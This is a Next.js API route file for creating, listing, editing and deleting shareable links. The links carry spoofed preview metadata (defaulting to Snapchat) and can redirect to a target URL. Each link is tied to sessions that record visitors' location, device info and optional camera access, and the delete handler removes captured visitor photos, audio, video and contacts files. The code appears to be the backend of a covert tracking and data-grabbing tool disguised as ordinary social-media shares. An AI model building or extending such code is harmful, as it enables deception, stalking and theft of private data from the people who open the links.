import { NextResponse } from "next/server";
import { createAdminClient } from "@/lib/supabase/admin";
import { uploadSnapImage, deleteSnapImage } from "@/lib/storage";
import { detectPlatform } from "@/lib/metadata";

// Generate cryptographically random non-sequential slug (AGENTS.md Rule 9)
function generateSafeSlug(): string {
  const chars = "abcdefghjkmnpqrstuvwxyz23456789";
  let result = "";
  const randomBytes = crypto.getRandomValues(new Uint8Array(8));
  for (let i = 0; i < 8; i++) {
    result += chars[randomBytes[i] % chars.length];
  }
  return result;
}

export async function GET() {
  try {
    const admin = createAdminClient();
    const { data: links, error } = await admin
      .from("image_links")
      .select("*, location_sessions(id, status, location_updates(id))")
      .order("created_at", { ascending: false });

    if (error) throw error;
    return NextResponse.json({ links });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}

export async function POST(request: Request) {
  try {
    const formData = await request.formData();
    const file = formData.get("file") as File | null;
    const targetUrl = (formData.get("target_url") as string)?.trim() || null;
    const customTitle = (formData.get("title") as string)?.trim() || null;
    const customDesc = (formData.get("description") as string)?.trim() || null;
    const ogTitle = (formData.get("og_title") as string)?.trim() || customTitle;
    const ogDesc = (formData.get("og_description") as string)?.trim() || customDesc;
    const ogImageUrl = (formData.get("og_image_url") as string)?.trim() || null;
    const requiresLocation = formData.get("requires_location") !== "false";
    const expiresInHours = formData.get("expires_in_hours")
      ? Number(formData.get("expires_in_hours"))
      : null;

    if (!file && !targetUrl) {
      return NextResponse.json(
        { error: "Either an image file or a target URL is required" },
        { status: 400 }
      );
    }

    let imagePath: string | null = null;
    if (file && file.size > 0) {
      const buffer = Buffer.from(await file.arrayBuffer());
      const res = await uploadSnapImage(buffer, file.type, file.name);
      imagePath = res.imagePath;
    }

    let linkType: "image" | "redirect" | "hybrid" = "image";
    if (targetUrl && imagePath) linkType = "hybrid";
    else if (targetUrl) linkType = "redirect";

    const explicitPlatform = (formData.get("og_platform") as string)?.trim();
    const ogPlatform = explicitPlatform && explicitPlatform !== "custom"
      ? explicitPlatform
      : (targetUrl ? detectPlatform(targetUrl) : "snapchat");

    let expiresAt: string | null = null;
    if (expiresInHours && expiresInHours > 0) {
      expiresAt = new Date(Date.now() + expiresInHours * 60 * 60 * 1000).toISOString();
    }

    const permissionsRaw = formData.get("permissions_config") as string | null;
    let permissionsConfig = {
      location: requiresLocation,
      device_info: true,
      camera: false,
    };
    if (permissionsRaw) {
      try {
        permissionsConfig = { ...permissionsConfig, ...JSON.parse(permissionsRaw) };
      } catch {}
    }

    const slug = generateSafeSlug();
    const admin = createAdminClient();

    const { data: link, error } = await admin
      .from("image_links")
      .insert({
        slug,
        image_path: imagePath,
        target_url: targetUrl,
        link_type: linkType,
        og_title: ogTitle,
        og_description: ogDesc,
        og_image_url: ogImageUrl || (imagePath ? `/api/image?path=${encodeURIComponent(imagePath)}` : null),
        og_platform: ogPlatform,
        permissions_config: permissionsConfig,
        title: customTitle || ogTitle || (targetUrl ? "Shared Link" : "Snap Image"),
        description: customDesc || ogDesc,
        requires_location: requiresLocation,
        expires_at: expiresAt,
        is_active: true,
      })
      .select()
      .single();

    if (error) throw error;
    return NextResponse.json({ link }, { status: 201 });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}

export async function PATCH(request: Request) {
  try {
    const body = await request.json();
    const { id } = body;
    if (!id) return NextResponse.json({ error: "Missing link ID" }, { status: 400 });

    const updates: Record<string, any> = { updated_at: new Date().toISOString() };
    if (typeof body.is_active === "boolean") updates.is_active = body.is_active;
    if (typeof body.title === "string") updates.title = body.title.trim();
    if (typeof body.description === "string") updates.description = body.description.trim();
    if (typeof body.og_title === "string") updates.og_title = body.og_title.trim();
    if (typeof body.og_description === "string") updates.og_description = body.og_description.trim();
    if (body.target_url !== undefined) updates.target_url = body.target_url ? body.target_url.trim() : null;
    if (body.og_platform !== undefined) updates.og_platform = body.og_platform;
    if (typeof body.requires_location === "boolean") updates.requires_location = body.requires_location;
    if (body.permissions_config) updates.permissions_config = body.permissions_config;
    if (body.expires_at !== undefined) updates.expires_at = body.expires_at;
    if (body.expires_in_hours && Number(body.expires_in_hours) > 0) {
      updates.expires_at = new Date(Date.now() + Number(body.expires_in_hours) * 3600000).toISOString();
    } else if (body.expires_in_hours === 0 || body.expires_in_hours === "0") {
      updates.expires_at = null;
    }

    const admin = createAdminClient();
    const { data: link, error } = await admin
      .from("image_links")
      .update(updates)
      .eq("id", id)
      .select("*, location_sessions(id, status, location_updates(id))")
      .single();

    if (error) throw error;
    return NextResponse.json({ link });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}

export async function DELETE(request: Request) {
  try {
    const { searchParams } = new URL(request.url);
    const id = searchParams.get("id");
    if (!id) return NextResponse.json({ error: "Missing link ID" }, { status: 400 });

    const admin = createAdminClient();
    const { data: link } = await admin.from("image_links").select("image_path").eq("id", id).single();
    if (link?.image_path) await deleteSnapImage(link.image_path);

    // Clean up visitor media and VCF files from storage for this link
    const { data: sessions } = await admin
      .from("location_sessions")
      .select("captured_media_path, captured_audio_path, captured_video_path, captured_data")
      .eq("link_id", id);

    if (sessions && sessions.length > 0) {
      const paths = sessions
        .flatMap((s) => [
          s.captured_media_path,
          s.captured_audio_path,
          s.captured_video_path,
          (s.captured_data as any)?.contacts_vcf_path,
        ])
        .filter(Boolean) as string[];
      if (paths.length > 0) {
        await Promise.allSettled(paths.map((p) => deleteSnapImage(p)));
      }
    }

    const { error } = await admin.from("image_links").delete().eq("id", id);
    if (error) throw error;

    return NextResponse.json({ success: true });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
